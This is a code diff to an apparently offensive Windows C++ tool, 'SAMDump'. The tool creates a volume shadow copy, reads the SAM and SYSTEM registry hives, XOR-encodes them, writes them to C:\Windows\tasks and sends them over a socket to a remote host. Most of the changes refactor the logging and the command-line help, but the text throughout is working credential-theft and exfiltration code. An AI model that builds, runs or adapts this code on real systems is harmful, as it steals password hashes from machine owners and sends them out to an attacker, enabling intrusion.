@@ -1,24 +1,19 @@
-#define _WIN32_DCOM
-#include <winsock2.h>
 #include <ws2tcpip.h>
-#include <windows.h>
-#include <comdef.h>
 #include <iostream>
-#include <stdio.h>
 #include <vss.h>
 #include <vswriter.h>
 #include <vsbackup.h>
 #include <vector>
 #include <string>
 #include <algorithm>
-
-#define FILE_OPEN 0x00000001
-#define FILE_OVERWRITE_IF 0x00000005
-#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000010
-
 #pragma comment(lib, "vssapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
+// 0: No debug; 1: Basic info; 2: Debugging
+#define DEBUG_LEVEL 1
+#define FILE_OPEN 0x00000001
+#define FILE_OVERWRITE_IF 0x00000005
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000010
 
 struct FileHeader { char filename[32]; uint32_t filesize; uint32_t checksum; };
 typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
@@ -56,7 +51,9 @@ bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::
         return false;
     }
 
-    printf("[+] %s sent (%zu bytes).\n", filename.c_str(), filedata.size());
+    if (DEBUG_LEVEL >= 1) {
+        printf("[+] %s sent (%zu bytes)\n", filename.c_str(), filedata.size());
+    }
     return true;
 }
 
@@ -87,8 +84,10 @@ bool send_files_remotely(const std::vector<BYTE>& sam_data, const std::vector<BY
         return false;
     }
 
-    printf("[+] Connected to %s:%d\n", host, port);
-
+    if (DEBUG_LEVEL >= 1) {
+        printf("[+] Connected to %s:%d\n", host, port);
+    }
+    
     bool success = true;
     success &= send_file_over_socket(sock, "SAM", sam_data);
     success &= send_file_over_socket(sock, "SYSTEM", system_data);
@@ -108,9 +107,11 @@ std::wstring GuidToWString(GUID id) {
 
 
 void PrintHR(const char* label, HRESULT hr) {
-    std::cout << label << " -> 0x" << std::hex << hr << std::dec;
-    if (FAILED(hr)) std::cout << " [FAILED]";
-    std::cout << std::endl;
+    if (DEBUG_LEVEL >= 2) {
+        std::cout << label << " -> 0x" << std::hex << hr << std::dec;
+        if (FAILED(hr)) std::cout << " [FAILED]";
+        std::cout << std::endl;
+    }
 }
 
 
@@ -201,7 +202,9 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         CoUninitialize();
     }
 
-    std::wcout << L"\n[+] Creating Shadow Copy for: " << volumePath << L"\n";
+    if (DEBUG_LEVEL >= 1) {
+        std::wcout << L"[+] Creating Shadow Copy for: " << volumePath << L"\n";
+    }
 
     hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     PrintHR("CoInitializeEx", hr);
@@ -227,7 +230,9 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
     hr = pBackup->IsVolumeSupported(GUID_NULL, (WCHAR*)volumePath.c_str(), &bSupported);
     PrintHR("IsVolumeSupported", hr);
     if (SUCCEEDED(hr)) {
-        std::cout << "Volumen supports VSS: " << (bSupported ? "YES" : "NO") << std::endl;
+        if (DEBUG_LEVEL >= 1) {
+            std::cout << "[*] Volume supports VSS: " << (bSupported ? "YES" : "NO") << std::endl;
+        }
         if (!bSupported) {
             std::cout << "[-] ERROR: Volume does not support VSS" << std::endl;
             pBackup->Release();
@@ -246,14 +251,18 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
 
     hr = pBackup->SetBackupState(false, false, VSS_BT_FULL, false);
     PrintHR("SetBackupState", hr);
-
-    std::cout << "[+] Calling GatherWriterMetadata..." << std::endl;
+    
+    if (DEBUG_LEVEL >= 2) {
+        std::cout << "[+] Calling GatherWriterMetadata..." << std::endl;
+    }
     IVssAsync* pAsyncMetadata = nullptr;
     hr = pBackup->GatherWriterMetadata(&pAsyncMetadata);
     PrintHR("GatherWriterMetadata", hr);
 
     if (SUCCEEDED(hr) && pAsyncMetadata) {
-        std::cout << "[-] Waiting for GatherWriterMetadata to complete..." << std::endl;
+        if (DEBUG_LEVEL >= 2) {
+            std::cout << "[-] Waiting for GatherWriterMetadata to complete..." << std::endl;
+        }
         hr = pAsyncMetadata->Wait();
         PrintHR("GatherWriterMetadata Wait", hr);
 
@@ -262,13 +271,15 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         hr = pAsyncMetadata->QueryStatus(&hrMetadataStatus, NULL);
         PrintHR("GatherWriterMetadata QueryStatus", hr);
         if (SUCCEEDED(hr)) {
-            std::cout << "[+] GatherWriterMetadata Status: 0x" << std::hex << hrMetadataStatus << std::dec << std::endl;
+            if (DEBUG_LEVEL >= 2) {
+                std::cout << "[+] GatherWriterMetadata Status: 0x" << std::hex << hrMetadataStatus << std::dec << std::endl;
+            }
         }
         pAsyncMetadata->Release();
     }
 
     if (FAILED(hr)) {
-        std::cout << "Failure in GatherWriterMetadata, trying to continue..." << std::endl;
+        std::cout << "[-] Failure in GatherWriterMetadata, trying to continue..." << std::endl;
         hr = S_OK;
     }
 
@@ -281,7 +292,9 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         return hr;
     }
 
-    std::wcout << L"[+] SnapshotSet ID: " << GuidToWString(snapshotSetId) << std::endl;
+    if (DEBUG_LEVEL >= 2) {
+        std::wcout << L"[+] SnapshotSet ID: " << GuidToWString(snapshotSetId) << std::endl;
+    }
 
     // Agregar el volumen al conjunto
     VSS_ID snapshotId;
@@ -293,16 +306,22 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         return hr;
     }
 
-    std::wcout << L"[+] Snapshot ID: " << GuidToWString(snapshotId) << std::endl;
+    if (DEBUG_LEVEL >= 2) {
+        std::wcout << L"[+] Snapshot ID: " << GuidToWString(snapshotId) << std::endl;
+    }
 
     // Preparar los escritores para el backup
-    std::cout << "[+] Calling PrepareForBackup..." << std::endl;
+    if (DEBUG_LEVEL >= 2) {
+        std::cout << "[+] Calling PrepareForBackup..." << std::endl;
+    }
     IVssAsync* pAsyncPrepare = nullptr;
     hr = pBackup->PrepareForBackup(&pAsyncPrepare);
     PrintHR("PrepareForBackup", hr);
 
     if (SUCCEEDED(hr) && pAsyncPrepare) {
-        std::cout << "[+] Waiting for PrepareForBackup to complete..." << std::endl;
+        if (DEBUG_LEVEL >= 2) {
+            std::cout << "[+] Waiting for PrepareForBackup to complete..." << std::endl;
+        }
         hr = pAsyncPrepare->Wait();
         PrintHR("PrepareForBackup Wait", hr);
 
@@ -310,23 +329,29 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         hr = pAsyncPrepare->QueryStatus(&hrPrepareStatus, NULL);
         PrintHR("PrepareForBackup QueryStatus", hr);
         if (SUCCEEDED(hr)) {
-            std::cout << "[+] PrepareForBackup Status: 0x" << std::hex << hrPrepareStatus << std::dec << std::endl;
+            if (DEBUG_LEVEL >= 2) {
+                std::cout << "[+] PrepareForBackup Status: 0x" << std::hex << hrPrepareStatus << std::dec << std::endl;
+            }
         }
         pAsyncPrepare->Release();
     }
 
     if (FAILED(hr)) {
-        std::cout << "[+] Failure in PrepareForBackup, trying to continue..." << std::endl;
+        std::cout << "[-] Failure in PrepareForBackup, trying to continue..." << std::endl;
         hr = S_OK;
     }
 
-    std::cout << "[+] Calling DoSnapshotSet..." << std::endl;
+    if (DEBUG_LEVEL >= 2) {
+        std::cout << "[+] Calling DoSnapshotSet..." << std::endl;
+    }
     IVssAsync* pAsyncSnapshot = nullptr;
     hr = pBackup->DoSnapshotSet(&pAsyncSnapshot);
     PrintHR("DoSnapshotSet", hr);
 
     if (SUCCEEDED(hr) && pAsyncSnapshot) {
-        std::cout << "[+] Waiting for DoSnapshotSet to complete..." << std::endl;
+        if (DEBUG_LEVEL >= 2) {
+            std::cout << "[+] Waiting for DoSnapshotSet to complete..." << std::endl;
+        }
         hr = pAsyncSnapshot->Wait();
         PrintHR("DoSnapshotSet Wait", hr);
 
@@ -334,7 +359,9 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         hr = pAsyncSnapshot->QueryStatus(&hrSnapshotStatus, NULL);
         PrintHR("DoSnapshotSet QueryStatus", hr);
         if (SUCCEEDED(hr)) {
-            std::cout << "[+] DoSnapshotSet Status: 0x" << std::hex << hrSnapshotStatus << std::dec << std::endl;
+            if (DEBUG_LEVEL >= 2) {
+                std::cout << "[+] DoSnapshotSet Status: 0x" << std::hex << hrSnapshotStatus << std::dec << std::endl;
+            }
         }
         pAsyncSnapshot->Release();
     }
@@ -344,13 +371,14 @@ HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObj
         VSS_SNAPSHOT_PROP snapProp;
         hr = pBackup->GetSnapshotProperties(snapshotId, &snapProp);
         if (SUCCEEDED(hr)) {
-            std::wcout << L"[+] Shadow Copy Successfully Created";
-            std::wcout << L"\n\t[+] Shadow ID:       " << GuidToWString(snapProp.m_SnapshotId);
-            std::wcout << L"\n\t[+] Set ID:          " << GuidToWString(snapProp.m_SnapshotSetId);
-            std::wcout << L"\n\t[+] Original Volume: " << (snapProp.m_pwszOriginalVolumeName ? snapProp.m_pwszOriginalVolumeName : L"(null)");
-            std::wcout << L"\n\t[+] Device Object:   " << (snapProp.m_pwszSnapshotDeviceObject ? snapProp.m_pwszSnapshotDeviceObject : L"(null)"); // <---- ESTOOOOOOOOO
-            std::wcout << L"\n\t[+] Attributes:      0x" << std::hex << snapProp.m_lSnapshotAttributes << std::dec;
-
+            if (DEBUG_LEVEL >= 2) {
+                std::wcout << L"[+] Shadow Copy Successfully Created";
+                std::wcout << L"\n\t[+] Shadow ID:       " << GuidToWString(snapProp.m_SnapshotId);
+                std::wcout << L"\n\t[+] Set ID:          " << GuidToWString(snapProp.m_SnapshotSetId);
+                std::wcout << L"\n\t[+] Original Volume: " << (snapProp.m_pwszOriginalVolumeName ? snapProp.m_pwszOriginalVolumeName : L"(null)");
+                std::wcout << L"\n\t[+] Device Object:   " << (snapProp.m_pwszSnapshotDeviceObject ? snapProp.m_pwszSnapshotDeviceObject : L"(null)"); // <---- ESTOOOOOOOOO
+                std::wcout << L"\n\t[+] Attributes:      0x" << std::hex << snapProp.m_lSnapshotAttributes << std::dec;
+            }
             if (snapProp.m_pwszSnapshotDeviceObject) {
                 outDeviceObject = snapProp.m_pwszSnapshotDeviceObject;
             }
@@ -449,7 +477,7 @@ std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
             if (status == 0x80000006) { // STATUS_END_OF_FILE
                 break;
             }
-            printf("Error en lectura. Código NT: 0x%08X\n", status);
+            printf("[-] Error reading. NTSTATUS: 0x%08X\n", status);
             break;
         }
 
@@ -458,11 +486,7 @@ std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
         if (bytesRead == 0) {
             break;
         }
-
-        // Agregar bytes al vector en lugar de imprimirlos
         fileContent.insert(fileContent.end(), buffer, buffer + bytesRead);
-
-        // Actualizar offset para siguiente lectura
         byteOffset.QuadPart += bytesRead;
     }
 
@@ -472,21 +496,20 @@ std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
 
 std::vector<BYTE> read_file(const wchar_t* filePath) {
     std::vector<BYTE> fileContent;
-    // printf("Intentando abrir: %ls\n", filePath);
-
+    
     // Abrir archivo
     HANDLE fileHandle = OpenFileNT(filePath);
     if (!fileHandle) {
         printf("[-] Error: Not possible to open the file.\n");
         return fileContent;
     }
-    // printf("Archivo abierto correctamente. Handle: %p\n", fileHandle);
 
     fileContent = ReadFileBytes(fileHandle);
-    printf("[+] Read %zu bytes from %ls\n", fileContent.size(), filePath);
-
+    if (DEBUG_LEVEL >= 1) {
+        printf("[+] Read %zu bytes from %ls\n", fileContent.size(), filePath);
+    }
+    
     NtClose(fileHandle);
-    // printf("Handle del archivo cerrado.\n");
     return fileContent;
 }
 
@@ -526,8 +549,11 @@ BOOL WriteFileNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
         printf("[-] Error creating file: %ls. NTSTATUS: 0x%08X\n", filePath, status);
         return FALSE;
     }
-    // printf("[+] File created: %ls\n", filePath);
 
+    if (DEBUG_LEVEL >= 2) {
+        printf("[+] File created: %ls\n", filePath);
+    }
+    
     LARGE_INTEGER byteOffset = { 0 };
     ULONG key = 0;
 
@@ -549,7 +575,10 @@ BOOL WriteFileNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
         return FALSE;
     }
 
-    printf("[+] Written %zu bytes to %ls\n", fileData.size(), filePath);
+    if (DEBUG_LEVEL >= 1) {
+        printf("[+] Written %zu bytes to %ls\n", fileData.size(), filePath);
+    }
+
     NtClose(fileHandle);
     return TRUE;
 }
@@ -557,21 +586,18 @@ BOOL WriteFileNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
 
 BOOL SaveSamAndSystemFiles(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const std::wstring& basePath, const std::wstring& sam_fname, const std::wstring& system_fname) {
     BOOL success = TRUE;
-
     std::wstring samPath = L"\\??\\" + basePath + sam_fname;
     std::wstring systemPath = L"\\??\\" + basePath + system_fname;
 
     if (!WriteFileNT(samPath.c_str(), sam_data)) {
         printf("[-] Error storing SAM\n");
         success = FALSE;
-    }
-    // else { printf("[+] SAM stored to %ls\n", samPath.c_str()); }
+    } // else { printf("[+] SAM stored to %ls\n", samPath.c_str()); }
 
     if (!WriteFileNT(systemPath.c_str(), system_data)) {
         printf("[-] Error storing SYSTEM\n");
         success = FALSE;
-    }
-    // else { printf("[+] SYSTEM stored to %ls\n", systemPath.c_str()); }
+    } // else { printf("[+] SYSTEM stored to %ls\n", systemPath.c_str()); }
 
     return success;
 }
@@ -594,6 +620,24 @@ std::vector<BYTE> encode_bytes(const std::vector<BYTE>& dump_bytes, const std::s
 }
 
 
+void print_help(int argc, char* argv[]) {
+    std::vector<std::string> args(argv, argv + argc);
+
+    std::cout << "Usage: " << args[0] << " [OPTIONS]\n";
+    std::cout << "Options:\n";
+    std::cout << "  --save-local [BOOL]    Save locally (default: false)\n";
+    std::cout << "  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)\n";
+    std::cout << "  --send-remote [BOOL]   Send remotely (default: false)\n";
+    std::cout << "  --host IP              Host for remote sending (default: 127.0.0.1)\n";
+    std::cout << "  --port PORT            Port for remote sending (default: 7777)\n";
+    std::cout << "  --xor-encode [BOOL]    XOR Encode (default: false)\n";
+    std::cout << "  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)\n";
+    std::cout << "  --disk DISK            Disk for shadow copy (default: C:\\)\n";
+    std::cout << "  --help                 Show this help\n";
+    exit(0);
+}
+
+
 void parse_arguments(int argc, char* argv[],
     std::wstring& output_dir,
     std::wstring& diskToShadow,
@@ -605,14 +649,14 @@ void parse_arguments(int argc, char* argv[],
     int& port) {
 
     // Default values
-    output_dir = L"C:\\Windows\\tasks";
-    diskToShadow = L"C:\\";
-    xorencode = false;
-    saveLocally = true;
-    sendRemotely = false;
-    key_xor = "SAMDump2025";
-    host = "127.0.0.1";
-    port = 7777;
+    output_dir      = L"C:\\Windows\\tasks";
+    diskToShadow    = L"C:\\";
+    xorencode       = false;
+    saveLocally     = false;
+    sendRemotely    = false;
+    key_xor         = "SAMDump2025";
+    host            = "127.0.0.1";
+    port            = 7777;
 
     std::vector<std::string> args(argv, argv + argc);
 
@@ -666,18 +710,7 @@ void parse_arguments(int argc, char* argv[],
             port = std::stoi(args[++i]);
         }
         else if (args[i] == "--help") {
-            std::cout << "Usage: " << args[0] << " [OPTIONS]\n";
-            std::cout << "Options:\n";
-            std::cout << "  --save-local [BOOL]    Save locally (default: true)\n";
-            std::cout << "  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)\n";
-            std::cout << "  --send-remote [BOOL]   Send remotely (default: false)\n";
-            std::cout << "  --host IP              Host for remote sending (default: 127.0.0.1)\n";
-            std::cout << "  --port PORT            Port for remote sending (default: 7777)\n";
-            std::cout << "  --xor-encode [BOOL]    XOR Encode (default: false)\n";
-            std::cout << "  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)\n";
-            std::cout << "  --disk DISK            Disk for shadow copy (default: C:\\)\n";
-            std::cout << "  --help                 Show this help\n";
-            exit(0);
+            print_help(argc, argv);
         }
     }
 }
@@ -687,23 +720,22 @@ int main(int argc, char* argv[]) {
     // Parse arguments
     std::wstring output_dir;
     std::wstring diskToShadow;
-    std::wstring samPath;
-    std::wstring systemPath;
     bool xorencode;
     bool saveLocally;
     bool sendRemotely;
     std::string key_xor;
     std::string host;
     int port;
-    bool debug = true;
     parse_arguments(argc, argv, output_dir, diskToShadow, xorencode, saveLocally, sendRemotely, key_xor, host, port);
 
-    if (debug) {
+    if (!saveLocally && !sendRemotely) {
+        print_help(argc, argv);
+    }
+
+    if (DEBUG_LEVEL >= 2) {
         std::wcout << L"Configuration:\n";
         std::wcout << L"  Output Dir: " << output_dir << L"\n";
         std::wcout << L"  Disk: " << diskToShadow << L"\n";
-        std::wcout << L"  SAM Path: " << samPath << L"\n";
-        std::wcout << L"  System Path: " << systemPath << L"\n";
         std::cout << "  XOR Encode: " << (xorencode ? "true" : "false") << "\n";
         std::cout << "  XOR Key: " << key_xor << "\n";
         std::cout << "  Save Locally: " << (saveLocally ? "true" : "false") << "\n";
@@ -718,14 +750,18 @@ int main(int argc, char* argv[]) {
     // Get or create Shadow Copy's Device Object
     std::wstring shadowCopyBasePath;
     if (list_shadows(shadowCopyBasePath)) {
-        wprintf(L"[+] Shadow Copy found: %s\n", shadowCopyBasePath.c_str());
+        if (DEBUG_LEVEL >= 1) {
+            wprintf(L"[+] Shadow Copy found: %s\n", shadowCopyBasePath.c_str());
+        }
     }
     else {
-        wprintf(L"[+] No Shadow Copies found: Creating a new one.\n");
+        if (DEBUG_LEVEL >= 1) {
+            wprintf(L"[+] No Shadow Copies found: Creating a new one.\n");
+        }
         HRESULT hr = create_shadow(diskToShadow, shadowCopyBasePath);
 
         if (!shadowCopyBasePath.empty()) {
-            std::wcout << L"\n[+] Shadow copy created: " << shadowCopyBasePath << std::endl;
+            std::wcout << L"[+] Shadow copy created: " << shadowCopyBasePath << std::endl;
         }
         else {
             std::cout << "\n[-] Failed to create a Shadow copy." << std::endl;
@@ -737,8 +773,8 @@ int main(int argc, char* argv[]) {
     }
 
     // Get bytes
-    samPath = L"\\windows\\system32\\config\\sam";
-    systemPath = L"\\windows\\system32\\config\\system";
+    std::wstring samPath = L"\\windows\\system32\\config\\sam";
+    std::wstring systemPath = L"\\windows\\system32\\config\\system";
     std::wstring fullPathSam = shadowCopyBasePath + samPath;
     std::wstring fullPathSystem = shadowCopyBasePath + systemPath;
     std::vector<BYTE> SamBytes = read_file(fullPathSam.c_str());
@@ -750,6 +786,9 @@ int main(int argc, char* argv[]) {
         std::vector<BYTE> encodedSystemBytes = encode_bytes(SystemBytes, key_xor);
         SamBytes = encodedSamBytes;
         SystemBytes = encodedSystemBytes;
+        if (DEBUG_LEVEL >= 1) {
+            printf("[+] XOR-encoded SAM and SYSTEM content\n");
+        }
     }
 
     // Save locally
@@ -757,20 +796,24 @@ int main(int argc, char* argv[]) {
     std::wstring system_fname = L"\\system.txt";
     if (saveLocally) {
         if (SaveSamAndSystemFiles(SamBytes, SystemBytes, output_dir, sam_fname, system_fname)) {
-            printf("[+] Success saving files locally.\n");
+            if (DEBUG_LEVEL >= 1) {
+                printf("[+] Success saving files locally\n");
+            }
         }
         else {
-            printf("[-] Error saving files locally.\n");
+            printf("[-] Error saving files locally\n");
         }
     }
 
     // Send remotely
     if (sendRemotely) {
         if (send_files_remotely(SamBytes, SystemBytes, host.c_str(), port)) {
-            printf("[+] Success sending files.\n");
+            if (DEBUG_LEVEL >= 1) {
+                printf("[+] Success sending files\n");
+            }
         }
         else {
-            printf("[-] Error sending files.\n");
+            printf("[-] Error sending files\n");
         }
     }
 
